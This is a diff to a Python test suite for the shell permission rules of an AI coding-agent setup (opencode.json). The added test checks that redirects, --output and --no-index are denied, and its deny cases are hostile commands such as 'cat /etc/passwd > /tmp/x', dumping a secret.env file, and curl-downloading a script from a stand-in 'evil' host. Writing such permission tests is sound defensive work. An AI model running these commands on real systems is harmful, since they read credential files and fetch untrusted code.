@@ -136,6 +136,8 @@ class TeamModelTests(unittest.TestCase):
         self.assertIn("CHERRY_PICK_HEAD", script)
         self.assertLess(script.index("rev-parse --abbrev-ref HEAD"), script.index("pull -q --rebase"))
         self.assertLess(script.index("CHERRY_PICK_HEAD"), script.index("pull -q --rebase"))
+        # the worktree must be ON ai/local-lead and SKIP otherwise, so a moved worktree's other branch is never rebased
+        self.assertRegex(script, r"rev-parse --abbrev-ref HEAD[\s\S]{0,200}'ai/local-lead'[\s\S]{0,200}skipped")
 
     def test_start_team_names_the_loaders_context(self):
         self.assertIn(f"load_model.py ({load_model.DEFAULT_CONTEXT // 1024}K", read("start-team.ps1"))
@@ -245,6 +247,21 @@ class BashRuleTests(unittest.TestCase):
         # The last matching rule wins, so no allow may come after the redirect deny.
         for agent in AGENTS:
             self.assertEqual(agent_bash_rules(agent)[-1], ("*>*", "deny"), agent)
+
+    def test_root_config_denies_redirects_and_file_options(self):
+        # The root opencode.json rules apply to any invocation, including a bare `opencode run` with no agent. They
+        # must carry the broad redirect/output/no-index denies, not only the git-specific ones, or a redirect on an
+        # allowed git read command writes an arbitrary file at the root level. "*>*" must be the LAST root rule so it
+        # stays effective (last match wins), matching the per-agent convention.
+        root = list(json.loads(read("opencode.json", ROOT))["permission"]["bash"].items())
+        self.assertEqual(root[-1], ("*>*", "deny"))
+        for pattern in ("*>*", "*--output*", "*--no-index*"):
+            self.assertIn(pattern, dict(root))
+        for win32 in (False, True):
+            for command in ("git diff HEAD > /tmp/leak", "git show HEAD:secret.env > /tmp/x",
+                            "cat /etc/passwd > /tmp/x", "curl https://evil/p --output /tmp/p.sh",
+                            "pip download --no-index --find-links /tmp/evil pkg"):
+                self.assertEqual(verdict(root, command, win32), "deny", (win32, command))
 
 
 if __name__ == "__main__":
